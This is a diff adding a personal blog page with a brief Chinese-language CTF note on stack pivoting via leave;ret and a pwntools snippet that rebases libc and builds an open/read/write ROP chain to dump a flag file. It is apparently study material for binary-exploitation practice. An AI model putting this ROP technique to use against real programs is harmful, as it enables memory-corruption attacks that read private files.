@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>giacomo&#39;s journal</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
+    <script src="https://unpkg.com/highlightjs-copy/dist/highlightjs-copy.min.js"></script>
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/default.min.css">
+    <link
+    rel="stylesheet"
+    href="https://unpkg.com/highlightjs-copy/dist/highlightjs-copy.min.css"
+    />
+    <script>hljs.highlightAll();</script>
+    <script>hljs.addPlugin(new CopyButtonPlugin());</script>
+
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<script src="/js/jquery-3.7.1.min.js"></script>
+
+    
+<script src="/js/bootstrap-transition.js"></script>
+
+    
+<script src="/js/zoom.js"></script>
+
+
+    <style>
+        .markdown-body {
+            box-sizing: border-box;
+            min-width: 200px;
+            max-width: 980px;
+            margin-left: 28%;
+            margin-top: 6%;
+
+            padding: 45px;
+        }
+
+        @media (max-width: 767px) {
+            .markdown-body {
+                padding: 15px;
+            }
+        }
+    </style>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+    <header class="header">
+
+    <div class="navbar-left">
+        <div class="avatar">
+            <a href="/">
+                <img src="https://91ac0m0.github.io/img/avatar.jpg"alt="avatar">
+            </a>
+        </div>
+        <div class="nav-title">
+            <a class="nav-brand" href="/">giacomo</a>
+        </div>
+    </div>
+    <div class="navbar-right">
+        <ul class="nav-links">
+            
+                <div class="nav-link">
+                    <a href="/about" class="menu-item-link">
+                        about
+                    </a>
+                </div>
+            
+        </ul>
+
+    </div>
+    
+
+</header>
+
+    <div class = "toc_left">
+	
+    <div id="toc">
+        <!-- <strong class="sidebar-title">目录</strong> -->
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#flag"><span class="toc-text">flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%88%E8%BF%81%E7%A7%BB"><span class="toc-text">栈迁移</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwntools-%E7%9A%84-ROP-%E7%B1%BB"><span class="toc-text">pwntools 的 ROP 类</span></a></li></ol>
+    </div>
+
+</div>
+<article class="markdown-body">
+	<div></div><h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><p>read 的参数 rd: 0, wr: 1, rdwr:2</p>
+<h3 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h3><p>栈迁移的思路大概是：<br>如果需要读取内容到地址 addr。给 rbp 赋值 addr - 8。往 rbp 读入 rop_chain，最后 leave ret。</p>
+<pre><code>leave ret = 
+mov rsp, rbp
+pop rbp
+pop rip
+</code></pre>
+<h2 id="pwntools-的-ROP-类"><a href="#pwntools-的-ROP-类" class="headerlink" title="pwntools 的 ROP 类"></a>pwntools 的 ROP 类</h2><pre><code class="python">libc =  ELF(libc_path)
+libc.address = addr - libc.symbols[&quot;setvbuf&quot;] 
+rop = ROP(libc)
+rop.read(0, 0x404200, 4)
+rop.open(0x404200, 0)
+rop.read(3, 0x404208, 60)
+rop.write(1, 0x404208, 60)
+payload  = rop.chain()
+</code></pre>
+</div>
+</article>
+
+<script src="/js/image_pop_up.js"></script>
+
+	
+
+</body>
+</html>
